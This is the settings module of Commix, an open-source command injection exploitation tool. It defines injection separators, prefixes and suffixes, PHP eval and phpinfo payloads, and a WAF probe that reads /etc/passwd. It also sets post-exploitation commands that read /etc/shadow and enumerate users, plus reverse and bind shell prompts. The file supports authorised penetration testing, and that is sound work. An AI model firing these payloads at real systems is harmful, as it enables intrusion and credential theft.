#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import random
import string
import codecs
from datetime import date
from datetime import datetime
from src.core.compat import xrange
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import reload_module as _reload_module

# argv checks
def sys_argv_checks():
  tamper_index = None
  for i in xrange(len(sys.argv)):
    # Disable coloring
    if sys.argv[i] == "--disable-coloring":
      from src.utils import colors
      colors.ENABLE_COLORING = False
    """
    Dirty hack from sqlmap [1], regarding merging of tamper script arguments (e.g. --tamper A --tamper B -> --tamper=A,B)
    [1] https://github.com/sqlmapproject/sqlmap/commit/f4a0820dcb5fded8bc4d0363c91276eb9a3445ae
    """
    if sys.argv[i].startswith("--tamper"):
      if tamper_index is None:
        tamper_index = i if '=' in sys.argv[i] else (i + 1 if i + 1 < len(sys.argv) and not sys.argv[i + 1].startswith('-') else None)
      else:
        sys.argv[tamper_index] = "%s,%s" % (sys.argv[tamper_index], sys.argv[i].split('=')[1] if '=' in sys.argv[i] else (sys.argv[i + 1] if i + 1 < len(sys.argv) and not sys.argv[i + 1].startswith('-') else ""))
        sys.argv[i] = ""

# argv checks
sys_argv_checks()
from src.thirdparty.colorama import Fore, Back, Style, init

class HTTPMETHOD(object):
  GET = "GET"
  POST = "POST"
  HEAD = "HEAD"
  PUT = "PUT"
  DELETE = "DELETE"
  TRACE = "TRACE"
  OPTIONS = "OPTIONS"
  CONNECT = "CONNECT"
  PATCH = "PATCH"

# Status
FAIL_MSG = Fore.RED + " " * 10 + Style.RESET_ALL
FAIL_STATUS = "" + FAIL_MSG + ""
info_msg = Fore.GREEN + " " * 10 + Style.RESET_ALL
SUCCESS_STATUS = "" + info_msg + ""

# Status Signs
LEGAL_DISCLAIMER = "(" + Style.BRIGHT + Fore.RED + "!" + Style.RESET_ALL + ") " + "Legal disclaimer: "
INFO_SIGN = Style.RESET_ALL + "[" + Fore.GREEN + "info" + Style.RESET_ALL + "] "
INFO_BOLD_SIGN = "[" + Fore.GREEN + Style.BRIGHT + "info" + Style.RESET_ALL + "] "
REQUEST_SIGN = Style.RESET_ALL + "[" + Style.BRIGHT + Back.MAGENTA + "traffic" + Style.RESET_ALL + "] "
RESPONSE_SIGN = Style.RESET_ALL + "[" + Style.BRIGHT + Back.MAGENTA + "traffic" + Style.RESET_ALL + "] "
QUESTION_SIGN = Style.BRIGHT
TOTAL_OF_REQUESTS_COLOR = Fore.LIGHTYELLOW_EX
WARNING_SIGN = "[" + Fore.LIGHTYELLOW_EX  + "warning" + Style.RESET_ALL + "] "
WARNING_BOLD_SIGN = "[" + Style.BRIGHT + Fore.YELLOW  + "warning" + Style.RESET_ALL + "] " + Style.BRIGHT
ERROR_SIGN = "[" + Fore.RED + "error" + Style.RESET_ALL  + "] "
ERROR_BOLD_SIGN = "["  + Style.BRIGHT + Fore.RED + "error" + Style.RESET_ALL  + "] "
CRITICAL_SIGN = "[" + Back.RED + "critical" + Style.RESET_ALL  + "] "
PAYLOAD_SIGN = "[" + Fore.CYAN + "payload" + Style.RESET_ALL + "] "
SUB_CONTENT_SIGN = " " * 11 + Fore.GREY + "|_ " + Style.RESET_ALL
SUB_CONTENT_SIGN_TYPE = Fore.LIGHTRED_EX + " * " + Style.RESET_ALL
TRAFFIC_SIGN = HTTP_CONTENT_SIGN = ""
ABORTION_SIGN = ERROR_SIGN
DEBUG_SIGN = "[" + Back.BLUE + Fore.WHITE + "debug" + Style.RESET_ALL + "] "
DEBUG_BOLD_SIGN = "[" + Back.BLUE + Style.BRIGHT + Fore.WHITE + "debug" + Style.RESET_ALL + "] " + Style.BRIGHT
CHECK_SIGN = DEBUG_SIGN + "Checking for a valid pair of HTTP authentication credentials: "
OS_SHELL_TITLE = Style.BRIGHT + "Pseudo-Terminal Shell (type '?' for available options)" + Style.RESET_ALL
OS_SHELL = """commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """
REVERSE_TCP_SHELL = """commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """
BIND_TCP_SHELL = """commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """

def print_time():
  return "[" + Fore.LIGHTBLUE_EX  + datetime.now().strftime("%H:%M:%S") + Style.RESET_ALL + "] "

# Print execution status
def execution(status):
  debug_msg = status + " " + APPLICATION + " at " + datetime.now().strftime("%H:%M:%S") + " (" + str(date.today()) + ")."
  return print_time() + DEBUG_SIGN + str(debug_msg) + Style.RESET_ALL

# Print legal disclaimer message
def print_legal_disclaimer_msg(legal_disclaimer_msg):
  result = LEGAL_DISCLAIMER + str(legal_disclaimer_msg) + Style.RESET_ALL
  return result

# Print error message
def print_error_msg(err_msg):
  result = print_time() + ERROR_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print error message
def print_bold_error_msg(err_msg):
  result = print_time() + ERROR_BOLD_SIGN + Style.BRIGHT + str(err_msg) + Style.RESET_ALL
  return result

# Print critical error message
def print_critical_msg(err_msg):
  result = print_time() + CRITICAL_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print abortion message
def print_abort_msg(abort_msg):
  result = print_time() + ABORTION_SIGN + str(abort_msg) + Style.RESET_ALL
  return result

# Print warning message
def print_warning_msg(warn_msg):
  result = print_time() + WARNING_SIGN + str(warn_msg) + Style.RESET_ALL
  return result

# Print warning message
def print_bold_warning_msg(warn_msg):
  result = print_time() +  WARNING_BOLD_SIGN + str(warn_msg) + Style.RESET_ALL
  return result

# Print debug message (verbose mode)
def print_debug_msg(debug_msg):
  result = print_time() + DEBUG_SIGN + debug_msg + Style.RESET_ALL
  return result

# Print bold debug message (verbose mode)
def print_bold_debug_msg(debug_msg):
  result = print_time() + DEBUG_BOLD_SIGN + debug_msg + Style.RESET_ALL
  return result

# Print request HTTP message
def print_request_msg(req_msg):
  result = print_time() + REQUEST_SIGN + str(req_msg) + Style.RESET_ALL
  return result

# Print response HTTP message
def print_response_msg(resp_msg):
  result = print_time() + RESPONSE_SIGN + str(resp_msg) + Style.RESET_ALL
  return result

# Print information message
def print_info_msg(info_msg):
  result = print_time() + INFO_SIGN + str(info_msg) + Style.RESET_ALL
  return result

# Print bold information message
def print_bold_info_msg(info_msg):
  result =  print_time() + INFO_BOLD_SIGN + Style.BRIGHT + str(info_msg) + Style.RESET_ALL
  return result

# Print payload (verbose mode)
def print_payload(payload):
  result = print_time() + PAYLOAD_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print HTTP traffic (verbose mode)
def print_traffic(traffic):
  result = TRAFFIC_SIGN + str(traffic) + Style.RESET_ALL
  return result

def print_request_num(number):
  result = TOTAL_OF_REQUESTS_COLOR + "#" + str(number) + Style.RESET_ALL
  return result

def print_output(output):
  result = Fore.GREEN + Style.BRIGHT + str(output) + Style.RESET_ALL
  return result

# Print HTTP response content (verbose mode)
def print_http_response_content(content):
  result = HTTP_CONTENT_SIGN + str(content) + Style.RESET_ALL
  return result

# Print checking message (verbose mode)
def print_checking_msg(payload):
  result = print_time() + CHECK_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print question message
def print_message(message):
  result = QUESTION_SIGN + message + Style.RESET_ALL
  return result

# Print sub content message
def print_sub_content(sub_content):
  result = SUB_CONTENT_SIGN + sub_content + Style.RESET_ALL
  return result

# Print sub content message
def print_retrieved_data(cmd, retrieved):
  result = print_time() + INFO_BOLD_SIGN + Style.BRIGHT + cmd + ": " + str(retrieved) + Style.RESET_ALL
  return result

# Print output of command execution
def command_execution_output(shell):
  result = Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL
  return result

"""
Print data to stdout
"""
def print_data_to_stdout(data):
  if END_LINE.CR not in data and data != "." and data != " (done)":
    data = data + END_LINE.LF
  sys.stdout.write(data)
  sys.stdout.flush()


"""
argv input errors
"""
def sys_argv_errors():
  _reload_module(sys)
  try:
    # Fix for Python 2.7
    sys.setdefaultencoding(DEFAULT_CODEC)
  except AttributeError:
    pass
  for i in xrange(len(sys.argv)):
    # Check for illegal (non-console) quote characters.
    if len(sys.argv[i]) > 1 and all(ord(_) in xrange(0x2018, 0x2020) for _ in ((sys.argv[i].split('=', 1)[-1].strip() or ' ')[0], sys.argv[i][-1])):
        err_msg = "Illegal (non-console) quote characters ('" + sys.argv[i] + "')."
        print_data_to_stdout(print_critical_msg(err_msg))
        raise SystemExit()
    # Check for illegal (non-console) comma characters.
    elif len(sys.argv[i]) > 1 and u"\uff0c" in sys.argv[i].split('=', 1)[-1]:
        err_msg = "Illegal (non-console) comma character ('" + sys.argv[i] + "')."
        print_data_to_stdout(print_critical_msg(err_msg))
        raise SystemExit()
    # Check for potentially miswritten (illegal '=') short option.
    elif re.search(r"\A-\w=.+", sys.argv[i]):
        err_msg = "Potentially miswritten (illegal '=') short option detected ('" + sys.argv[i] + "')."
        print_data_to_stdout(print_critical_msg(err_msg))
        raise SystemExit()

# argv checks
sys_argv_checks()

"""
The global variables.
"""
# About
APPLICATION = "commix"
DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
DESCRIPTION = "The command injection exploiter"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION_NUM = "4.1"
REVISION = "32"
STABLE_RELEASE = False
VERSION = "v"
if STABLE_RELEASE:
  VERSION = VERSION + VERSION_NUM
  COLOR_VERSION = Style.BRIGHT + Style.UNDERLINE + Fore.WHITE + VERSION + Style.RESET_ALL
else:
  VERSION = VERSION + VERSION_NUM + ".dev" + REVISION
  COLOR_VERSION = Style.UNDERLINE + Fore.WHITE + VERSION + Style.RESET_ALL

YEAR = "2014-2025"
AUTHOR_X_ACCOUNT = "@ancst"
APPLICATION_URL = "https://commixproject.com"
APPLICATION_X_ACCOUNT = "@commixproject"

# Default User-Agent
DEFAULT_USER_AGENT = APPLICATION + "/" + VERSION + " (" + APPLICATION_URL + ")"

# Legal Disclaimer
LEGAL_DISCLAIMER_MSG = "Usage of " + APPLICATION + " for attacking targets without prior mutual consent is illegal. " + \
                       "It is the end user's responsibility to obey all applicable local, state and federal laws. " + \
                       "Developers assume no liability and are not responsible for any misuse or damage caused by this program.\n"

# Random string generator
RANDOM_STRING_GENERATOR = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(10))
# Random variable name
RANDOM_VAR_GENERATOR = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))

START_TIME = time.time()

# Maximum number of lines to save in history file
MAX_HISTORY_LENGTH = 1000

# Readline
READLINE_ERROR = False

# User-applied operating system command
USER_APPLIED_CMD = ""

# Random Tag
RANDOM_TAG = ""

if RANDOM_TAG == "" :
  RANDOM_TAG = RANDOM_STRING_GENERATOR

# Proxy
PROXY_REGEX = r"((http[^:]*)://)?([\w\-.]+):(\d+)"

# Auth Credentials format
AUTH_CRED_REGEX = r"^(.*?):(.*?)$"

# Inject Tag
INJECT_TAG = "INJECT_HERE"
INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
INJECT_INSIDE_BOUNDARIES = None

# Default (windows) target host's python interpreter
WIN_PYTHON_INTERPRETER = "python.exe"
WIN_CUSTOM_PYTHON_INTERPRETER = "C:\\Python27\\python.exe"
USER_DEFINED_PYTHON_DIR = False

# Default (linux) target host's python interpreter
LINUX_PYTHON_INTERPRETER = "python3"
LINUX_CUSTOM_PYTHON_INTERPRETER = "python27"
USER_DEFINED_PYTHON_INTERPRETER = False

CMD_NUL = ""

CMD_SUB_PREFIX = "$("
CMD_SUB_SUFFIX = ")"

# Maybe a WAF/IPS protection.
WAF_CHECK_PAYLOAD = "cat /etc/passwd|uname&&ping -c3 localhost;ls ../"
WAF_ENABLED = False

class HEURISTIC_TEST(object):
  POSITIVE = True

#Basic heuristic checks for command injections
RAND_A = random.randint(1,10000)
RAND_B = random.randint(1,10000)
CALC_STRING = str(RAND_A) + " %2B " + str(RAND_B)
BASIC_STRING = ""
BASIC_COMMAND_INJECTION_PAYLOADS = []
ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + CMD_SUB_PREFIX + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + CMD_SUB_SUFFIX + 
                                                "%26echo " + CMD_SUB_PREFIX + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + CMD_SUB_SUFFIX + 
                                                "|echo " + CMD_SUB_PREFIX + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + CMD_SUB_SUFFIX + 
                                                RANDOM_STRING_GENERATOR,
                                                "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + 
                                                " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
                                                ]
BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
IDENTIFIED_COMMAND_INJECTION = False

#Basic heuristic checks for code injection warnings or... phpinfo page ;)
PHPINFO_PAYLOAD = "phpinfo()"

PHP_EXEC_FUNCTIONS = [ "" + PHPINFO_PAYLOAD + "",
  "exec(" + PHPINFO_PAYLOAD + ")",
  "eval(" + PHPINFO_PAYLOAD + ")",
  "system(" + PHPINFO_PAYLOAD + ")"
]

PHPINFO_CHECK_PAYLOADS = [
  [".print(" + x + ")" for x in PHP_EXEC_FUNCTIONS],
  [")'}" + x + "'#" for x in PHP_EXEC_FUNCTIONS],
  ["'." + x + ".'" for x in PHP_EXEC_FUNCTIONS],
  ["{${" + x + "}}" for x in PHP_EXEC_FUNCTIONS],
  ["\\\\/{${" + x + "}}\\/\\" for x in PHP_EXEC_FUNCTIONS]
]

PHPINFO_CHECK_PAYLOADS = [x for payload in PHPINFO_CHECK_PAYLOADS for x in payload]

# Executed phpinfo()
IDENTIFIED_PHPINFO = False
CODE_INJECTION_PHPINFO = r"PHP Version </td><td class=\"v\">(([\w\.]+))"

# Code injection warnings
IDENTIFIED_WARNINGS = False
CODE_INJECTION_WARNINGS = ["eval()'d code", "runtime-created function", "usort()", "assert()", "preg_replace()"]

SKIP_CODE_INJECTIONS = False
SKIP_COMMAND_INJECTIONS = False

USER_DEFINED_URL_DATA = False
# User-defined stored POST data.
USER_DEFINED_POST_DATA = ""
# Ignore user-defined stored POST data.
IGNORE_USER_DEFINED_POST_DATA = False

# Custom injection marker
CUSTOM_INJECTION_MARKER_CHAR = "*"
CUSTOM_INJECTION_MARKER = False
ASTERISK_MARKER = "__ASTERISK__"
CUSTOM_INJECTION_MARKER_PARAMETERS_LIST = []
PRE_CUSTOM_INJECTION_MARKER_CHAR = ""
POST_CUSTOM_INJECTION_MARKER_CHAR = ""

class INJECTION_MARKER_LOCATION(object):
  URL = False
  DATA = False
  COOKIE = False
  HTTP_HEADERS = False
  CUSTOM_HTTP_HEADERS = False

SKIP_NON_CUSTOM = None

# Testable parameter(s) - comma separated.
TESTABLE_PARAMETERS_LIST = []
TESTABLE_PARAMETERS = None
NOT_TESTABLE_PARAMETERS = True

# Skip testing for given parameter(s) - comma separated.
SKIP_PARAMETER = ""

# Use a proxy to connect to the target URL.
SCHEME = ""

class OS(object):
  UNIX = "unix"
  WINDOWS = "windows"

# Default target host OS (Unix-like)
TARGET_OS = OS.UNIX

IDENTIFIED_TARGET_OS = False
IGNORE_IDENTIFIED_OS = None

# Verbosity level (0-4, Default: 0)
VERBOSITY_LEVEL = 0

# Local HTTP server ip
LOCAL_HTTP_IP = ""

# Local HTTP server port
LOCAL_HTTP_PORT = random.randint(50000,60000)

HTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "data", "html"))
DISABLED_CONTENT_EXTENSIONS = (".py", ".pyc", ".md", ".txt", ".bak", ".conf", ".zip", "~")

# Detection / Exploitation phase(s)
WAF_DETECTION_PHASE = False
DETECTION_PHASE = False
EXPLOITATION_PHASE = False

# Exploitation techniques states
CLASSIC_STATE = False
EVAL_BASED_STATE = False
TIME_BASED_STATE = False
FILE_BASED_STATE = False
TEMPFILE_BASED_STATE = False
TIME_RELATED_ATTACK = False

# Stored applied techniques
SESSION_APPLIED_TECHNIQUES = ""

# The name of the operating system dependent module imported.
PLATFORM = os.name
IS_WINDOWS = PLATFORM == "nt"

# Check if OS is Windows.
#IS_WINDOWS = hasattr(sys, "getwindowsversion")

# Git URL.
GIT_URL = "https://github.com/commixproject/" + APPLICATION + ".git"

# Git issue URL.
ISSUES_PAGE = "https://github.com/commixproject/" + APPLICATION + "/issues/new"

COMMIX_ROOT_PATH = os.path.abspath(os.curdir)

# Output Directory
OUTPUT_DIR = ".output/"

# Output file name
OUTPUT_FILE_NAME = "logs"

# Output file name
OUTPUT_FILE_EXT = ".txt"
OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT

# Max Length for command execution output.
MAXLEN = 10000

STDIN_PARSING = False

# Maximum response total page size (trimmed if larger)
MAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024

# Slow target response.
SLOW_TARGET_RESPONSE = 3

# The testable parameter.
TESTABLE_PARAMETER = ""

TESTABLE_VALUE = ""

# The HTTP header name.
HTTP_HEADER = ""

EXTRA_HTTP_HEADERS = False

# The command injection separators.
SEPARATORS = []
DEFAULT_SEPARATORS = [";", "%26", "|", ""]
SPECIAL_SEPARATORS = ["%26%26", "||", "%0a", "%0d%0a", "%1a"]
SEPARATORS_LVL1 = DEFAULT_SEPARATORS + SPECIAL_SEPARATORS
SEPARATORS_LVL3 = SEPARATORS_LVL2 = SEPARATORS_LVL1

# The command injection prefixes.
PREFIXES = []
PREFIXES_LVL1 = [""]
PREFIXES_LVL2 = PREFIXES_LVL1 + SEPARATORS_LVL1
PREFIXES_LVL3 = PREFIXES_LVL2 + ["'", "\""]

# The command injection suffixes.
SUFFIXES = []
SUFFIXES_LVL1 = [""]
SUFFIXES_LVL2 = SUFFIXES_LVL1 + SEPARATORS_LVL1
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'", "\"", " #", "//", "\\\\"]

# Bad combination of prefix and separator
JUNK_COMBINATION = [SEPARATORS_LVL1[i] + SEPARATORS_LVL1[j] for i in range(len(SEPARATORS_LVL1)) for j in range(len(SEPARATORS_LVL1))]

# Execution functions
EXECUTION_FUNCTIONS = []
EXECUTION_FUNCTIONS_LVL1 = ["exec"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["system", "shell_exec"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["passthru", "proc_open", "popen"]

# The code injection separators.
EVAL_SEPARATORS = []
EVAL_SEPARATORS_LVL1 = [""]
EVAL_SEPARATORS_LVL2 = EVAL_SEPARATORS_LVL1 + ["%0a"]
EVAL_SEPARATORS_LVL3 = EVAL_SEPARATORS_LVL2 + ["%0d%0a"]

# The code injection prefixes.
EVAL_PREFIXES = []
EVAL_PREFIXES_LVL1 = [".", "'.", "{${"]
EVAL_PREFIXES_LVL2 = EVAL_PREFIXES_LVL1 + [")'}", "');}"]
EVAL_PREFIXES_LVL3 = EVAL_PREFIXES_LVL2 + ["\".", "')", "\")", ");}", "\");}", ")", ";", "'", ""]

# The code injection suffixes.
EVAL_SUFFIXES = []
EVAL_SUFFIXES_LVL1 = [ "",  ".'", "}}"]
EVAL_SUFFIXES_LVL2 = EVAL_SUFFIXES_LVL1 + ["'#"]
EVAL_SUFFIXES_LVL3 = EVAL_SUFFIXES_LVL2 + [".\"", "\\\\", "//", ")}", "#"]

# Raw payload (without tampering)
RAW_PAYLOAD = ""

# Single whitespace
SINGLE_WHITESPACE = " "

# The default (url-ecoded) white-space.
WHITESPACES = [_urllib.parse.quote(SINGLE_WHITESPACE)]

# Reference: http://www.w3.org/Protocols/HTTP/Object_Headers.html#uri
URI_HTTP_HEADER = "URI"

# Seconds to delay between each HTTP request.
DELAY = 0

# Seconds to delay the OS response.
TIMESEC = 0

# Seconds to delay between each HTTP retry.
DELAY_RETRY = 1

DEFAULT_INJECTION_LEVEL = 1
COOKIE_INJECTION_LEVEL = 2
HTTP_HEADER_INJECTION_LEVEL = 3

# Level of tests to perform.
# The higher the value is, the higher the number of HTTP(s) requests are. (Default: 1)
INJECTION_LEVEL = 0
USER_APPLIED_LEVEL = False
PERFORM_BASIC_SCANS = True

# Start scanning state
START_SCANNING = None

# Default Temp Directory
TMP_PATH = ""

# Default Server's Web-Root Directory
WEB_ROOT = ""
DEFAULT_WEB_ROOT = ""
CUSTOM_WEB_ROOT = False

# Counting the total of HTTP(S) requests
TOTAL_OF_REQUESTS = 0

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
# Output PowerShell's version number
PS_VERSION = "powershell.exe -InputFormat none write-host ([string]$(cmd /c powershell.exe -InputFormat none get-host)[3]).replace('Version','').replace(' ','').substring(1,3)"

# Current user
CURRENT_USER = "whoami"
WIN_CURRENT_USER = "echo %USERNAME%"

# The hostname
HOSTNAME = "hostname"
WIN_HOSTNAME = "echo %COMPUTERNAME%"

# Check if Current user is privileged
# Unix-like: root
IS_ROOT = "echo $(id -u)"
# Windows: admin
IS_ADMIN = "powershell.exe -InputFormat none [Security.Principal.WindowsBuiltinRole]::Administrator"

# Operation System.
RECOGNISE_OS = "uname -s"
WIN_RECOGNISE_OS = "ver"

# Distribution Description / Release
DISTRO_INFO = "echo $(lsb_release -sir)"

# Hardware platform.
RECOGNISE_HP = "uname -m"
WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"

# File System access options
# Read file
FILE_READ = "cat "
FILE_WRITE_OPERATOR = " > "
WIN_FILE_WRITE_OPERATOR = "powershell.exe Set-Content "
WIN_FILE_READ = "powershell.exe get-Content "

# List file
FILE_LIST = "ls "
FILE_LIST_WIN = "powershell.exe Test-Path -Path "

CERTUTIL_DECODE_CMD = "certutil -decode "

# Write file
FILE_WRITE = "printf "

# Write file
FILE_UPLOAD = "wget "

# /etc/passwd
PASSWD_FILE = "/etc/passwd"

SYS_USERS = EVAL_SYS_USERS  = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE

# Exports users of localgroup
WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)]))"
DEFAULT_WIN_USERS = ["Administrator", "DefaultAccount", "Guest"]

# /etc/shadow
SHADOW_FILE = "/etc/shadow"
SYS_PASSES = FILE_READ + SHADOW_FILE

WIN_REPLACE_WHITESPACE = r"-replace('\s+',' '))"

# Accepts 'YES','YE','Y','yes','ye','y'
CHOICE_YES = ['YES','YE','Y','yes','ye','y']

# Accepts 'NO','N','no','n'
CHOICE_NO = ['NO','no','N','n']

# Accepts 'QUIT','Q','quit','q'
CHOICE_QUIT = ['QUIT','quit','Q','q']

# Accepts 'W','w','U','u','Q','q'
CHOICE_OS = ['W','w','U','u','Q','q','N','n']

# Accepts 'C','c','S','s','Q','q','A','a'
CHOICE_PROCEED = ['C','c','S','s','Q','q','A','a']

# Available alternative shells
AVAILABLE_SHELLS = ["python"]

# Available injection techniques.
AVAILABLE_TECHNIQUES = ['c','e','t','f']

# Supported injection types
class INJECTION_TYPE(object):
  RESULTS_BASED_CI = "results-based OS command injection"
  RESULTS_BASED_CE = "results-based dynamic code evaluation"
  BLIND = "blind OS command injection"
  SEMI_BLIND = "semi-blind OS command injection"

# Supported injection techniques
class INJECTION_TECHNIQUE(object):
  CLASSIC = "classic command injection technique"
  DYNAMIC_CODE = "dynamic code evaluation technique"
  TIME_BASED = "time-based command injection technique"
  FILE_BASED = "file-based command injection technique"
  TEMP_FILE_BASED = "tempfile-based injection technique"

USER_APPLIED_TECHNIQUE = False
SKIP_TECHNIQUES = False

# User Agent List
USER_AGENT_LIST = [
        # Opera
        "Opera/8.0 (X11; Linux i686; U; en)",
        "Opera/9.01 (X11; FreeBSD 6 i386; U; en)"
        "Opera/8.51 (FreeBSD 5.1; U; en)",
        "Opera/8.51 (Macintosh; PPC Mac OS X; U; de)",
        "Opera/9.00 (Macintosh; PPC Mac OS X; U; es)",
        "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
        # Mozilla Firefox
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20131331 Firefox/31.0",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13 (.NET CLR 3.0.04506.31)",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.31; .NET CLR 3.0.04506.648)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.1.6) Gecko/20091216 Fedora/3.5.6-1.fc11 Firefox/3.5.6 GTB6",
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.1b3) Gecko/20090315 Firefox/3.1b3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20131401 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.34 (KHTML, like Gecko) Dooble/1.40 Safari/534.34",
        # Oldies
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
        "mozilla/3.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/5.0.1",
]

# Mobile User Agents
MOBILE_USER_AGENT_LIST = [
        "Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G931V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3171.125 Mobile Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; HP iPAQ h6310)",
        "Mozilla/5.0 (Linux; Android 8.0.0; HTC 10 Build/OPR1.170623.027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H891L Build/HuaweiH891L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
        "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977",
        "Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
        "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
        "Mozilla/5.0 (Linux; Android 8.0.0; Pixel Build/OPR3.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 4.4.4; en-gb; MI 3W Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1",
]

# Default Scheme
SCHEME = ""

# TOR HTTP Proxy
TOR_HTTP_PROXY_IP = "127.0.0.1"
TOR_HTTP_PROXY_PORT = "8118"
TOR_HTTP_PROXY_SCHEME = "https"
CHECK_TOR_PAGE = "https://check.torproject.org/"

# Cookie injection
COOKIE_INJECTION = None

HTTP_HEADERS_INJECTION = None
# User-Agent injection
USER_AGENT_INJECTION = None

# Referer injection
REFERER_INJECTION = None

# Host injection
HOST_INJECTION = None

# Custom HTTP Headers injection
CUSTOM_HEADER_INJECTION = False
CUSTOM_HEADERS_NAMES = []
CUSTOM_HEADER_CHECK = ""
CUSTOM_HEADER_NAME = ""
CUSTOM_HEADER_VALUE = ""

# Valid URL format check
